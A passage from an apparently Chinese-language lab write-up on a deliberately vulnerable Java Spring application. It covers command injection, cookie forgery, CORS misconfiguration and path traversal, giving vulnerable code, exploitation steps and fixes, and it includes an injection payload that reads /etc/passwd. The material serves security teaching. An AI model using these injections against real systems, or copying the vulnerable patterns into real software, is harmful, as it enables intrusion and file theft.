<span class="string">&quot;ls -la &quot;</span> + filepath&#125;;</span><br><span class="line">    <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">    builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">    <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将传入的参数直接与原命令拼接，实现命令注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=;cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png" alt="image-20250728143906716" loading="lazy"></p><h4 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/host&quot;)</span><br><span class="line">    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String host = request.getHeader(&quot;host&quot;);</span><br><span class="line">        logger.info(host);</span><br><span class="line">        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">        ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">        builder.redirectErrorStream(true);</span><br><span class="line">        Process process = builder.start();</span><br><span class="line">        return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样可以使用命令拼接，但需要再host字段处进行传参（不知道为啥我传不上去，用大佬的图片代替一下）</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png" alt="image-20250728145951030" loading="lazy"></p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath = SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null == filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process = builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmdFilter函数代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);</span><br><span class="line">   public static String cmdFilter(String input) &#123;</span><br><span class="line">        if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>限制了参数中的字符，防止命令注入。</p><h3 id="Cookie伪造"><a href="#Cookie伪造" class="headerlink" title="Cookie伪造"></a>Cookie伪造</h3><h4 id="1-cookie-vuln01"><a href="#1-cookie-vuln01" class="headerlink" title="1.&#x2F;cookie&#x2F;vuln01"></a>1.&#x2F;cookie&#x2F;vuln01</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private static String NICK = &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(value = &quot;/vuln01&quot;)</span><br><span class="line">public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">    String nick = WebUtils.getCookieValueByName(req, NICK); // key code</span><br><span class="line">    return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-cookie-vuln02"><a href="#2-cookie-vuln02" class="headerlink" title="2.&#x2F;cookie&#x2F;vuln02"></a>2.&#x2F;cookie&#x2F;vuln02</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln02&quot;)</span><br><span class="line">   public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">       String nick = null;</span><br><span class="line">       Cookie[] cookie = req.getCookies();</span><br><span class="line"></span><br><span class="line">       if (cookie != null) &#123;</span><br><span class="line">           nick = getCookie(req, NICK).getValue();  // key code</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-cookie-vuln03"><a href="#3-cookie-vuln03" class="headerlink" title="3.&#x2F;cookie&#x2F;vuln03"></a>3.&#x2F;cookie&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   @GetMapping(value = &quot;/vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                // key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line">Java复制代码1234567891011121314</span><br></pre></td></tr></table></figure><h4 id="4-cookie-vuln04"><a href="#4-cookie-vuln04" class="headerlink" title="4.&#x2F;cookie&#x2F;vuln04"></a>4.&#x2F;cookie&#x2F;vuln04</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-cookie-vuln05"><a href="#5-cookie-vuln05" class="headerlink" title="5.&#x2F;cookie&#x2F;vuln05"></a>5.&#x2F;cookie&#x2F;vuln05</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln05&quot;)</span><br><span class="line"> public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">     return &quot;Cookie nick: &quot; + nick;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="6-cookie-vuln06"><a href="#6-cookie-vuln06" class="headerlink" title="6.&#x2F;cookie&#x2F;vuln06"></a>6.&#x2F;cookie&#x2F;vuln06</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用."></a>漏洞利用.</h4><p>我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png" alt="image-20250729104624089" loading="lazy"></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>跨源资源共享</strong>（CORS，全称为 Cross-Origin Resource Sharing）是一种基于 HTTP 头的机制，允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。CORS 机制通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。</p><p>比如说：有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。</p><h4 id="1-cors-vuln-origin"><a href="#1-cors-vuln-origin" class="headerlink" title="1.&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.&#x2F;cors&#x2F;vuln&#x2F;origin</h4><pre><code>private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;@GetMapping(&quot;/vuln/origin&quot;)public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;    String origin = request.getHeader(&quot;origin&quot;);    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie    return info;&#125;</code></pre><h4 id="2-cors-vuln-setHeader"><a href="#2-cors-vuln-setHeader" class="headerlink" title="2.&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.&#x2F;cors&#x2F;vuln&#x2F;setHeader</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br><span class="line">    public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-cors-vuln-crossOrigin"><a href="#3-cors-vuln-crossOrigin" class="headerlink" title="3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;*&quot;)</span><br><span class="line">@RequestMapping(&quot;/vuln/crossOrigin&quot;)</span><br><span class="line">public String vuls3() &#123;</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>我们可以通过修改origin字段来验证漏洞</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png" alt="image-20250729140718474" loading="lazy"></p><h4 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><h5 id="（1）限制origin"><a href="#（1）限制origin" class="headerlink" title="（1）限制origin"></a>（1）限制origin</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)</span><br><span class="line">  @GetMapping(&quot;/sec/crossOrigin&quot;)</span><br><span class="line">  public String secCrossOrigin() &#123;</span><br><span class="line">      return info;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="（2）WebMvcConfigurer设置Cors"><a href="#（2）WebMvcConfigurer设置Cors" class="headerlink" title="（2）WebMvcConfigurer设置Cors"></a>（2）WebMvcConfigurer设置Cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/webMvcConfigurer&quot;)</span><br><span class="line">  public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">      return token;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应的过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public WebMvcConfigurer corsConfigurer() &#123;</span><br><span class="line">    return new WebMvcConfigurerAdapter() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void addCorsMappings(CorsRegistry registry) &#123;</span><br><span class="line">            // 为了支持一级域名，重写了checkOrigin</span><br><span class="line">            //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;</span><br><span class="line">            registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**表示所有路由path</span><br><span class="line">                    //.allowedOrigins(allowOrigins)</span><br><span class="line">                    .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)</span><br><span class="line">                    .allowCredentials(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="（3）spring-security设置cors"><a href="#（3）spring-security设置cors" class="headerlink" title="（3）spring security设置cors"></a>（3）spring security设置cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/httpCors&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应过滤器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CorsConfigurationSource corsConfigurationSource()</span><br><span class="line">&#123;</span><br><span class="line">    // Set cors origin white list</span><br><span class="line">    ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();</span><br><span class="line">    allowOrigins.add(&quot;joychou.org&quot;);</span><br><span class="line">    allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。</span><br><span class="line"></span><br><span class="line">    CorsConfiguration configuration = new CorsConfiguration();</span><br><span class="line">    configuration.setAllowedOrigins(allowOrigins);</span><br><span class="line">    configuration.setAllowCredentials(true);</span><br><span class="line">    configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));</span><br><span class="line">    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">    source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style</span><br><span class="line">    return source;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="（4）自定义filter设置cors"><a href="#（4）自定义filter设置cors" class="headerlink" title="（4）自定义filter设置cors"></a>（4）自定义filter设置cors</h5><p>防御代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/originFilter&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应过滤器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)</span><br><span class="line">public class OriginFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private final Logger logger = LoggerFactory.getLogger(this.getClass());</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line">        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line"></span><br><span class="line">        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑</span><br><span class="line">        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +</span><br><span class="line">                    &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line">            response.setStatus(response.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="（5）CorsFilter设置cors"><a href="#（5）CorsFilter设置cors" class="headerlink" title="（5）CorsFilter设置cors"></a>（5）CorsFilter设置cors</h5><p>防御代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/sec/corsFilter&quot;)</span><br><span class="line">   public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">       return token;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>对应过滤器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class BaseCorsFilter extends CorsFilter &#123;</span><br><span class="line"></span><br><span class="line">    public BaseCorsFilter() &#123;</span><br><span class="line">        super(configurationSource());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static UrlBasedCorsConfigurationSource configurationSource() &#123;</span><br><span class="line">        CorsConfiguration config = new CorsConfiguration();</span><br><span class="line">        config.setAllowCredentials(true);</span><br><span class="line">        config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持</span><br><span class="line">        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);</span><br><span class="line">        config.addAllowedHeader(&quot;*&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;GET&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;POST&quot;);</span><br><span class="line"></span><br><span class="line">        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);</span><br><span class="line"></span><br><span class="line">        return source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（6）origin检查"><a href="#（6）origin检查" class="headerlink" title="（6）origin检查"></a>（6）origin检查</h5><p>防御代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/checkOrigin&quot;)</span><br><span class="line">public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">    // 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">    // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">    if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">        return &quot;Origin is not safe.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">    return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><h4 id="1-path-traversal-vul"><a href="#1-path-traversal-vul" class="headerlink" title="1.&#x2F;path_traversal&#x2F;vul"></a>1.&#x2F;path_traversal&#x2F;vul</h4><p>漏洞代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  @GetMapping(&quot;/path_traversal/vul&quot;)</span><br><span class="line">    public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">        return getImgBase64(filepath);</span><br><span class="line">    &#125;</span><br><span class="line">private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">        logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">        File f = new File(imgFile);</span><br><span class="line">        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">            byte[] data = Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">            return new String(Base64.encodeBase64(data));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;File doesn&#x27;t exist or is not a file.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在目录穿越，我们直接读取文件</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png" alt="image-20250730110528049" loading="lazy"></p><p>修复代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/path_traversal/sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) == null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pathFilter函数内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">       String temp = filepath;</span><br><span class="line"></span><br><span class="line">       // use while to sovle multi urlencode</span><br><span class="line">       while (temp.indexOf(&#x27;%&#x27;) != -1) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               temp = URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">           &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">               logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">               return null;</span><br><span class="line">           &#125; catch (Exception e) &#123;</span><br><span class="line">               logger.info(e.toString());</span><br><span class="line">               return null;</span><br><span class="line">           &#125;</span><br><span class="line">       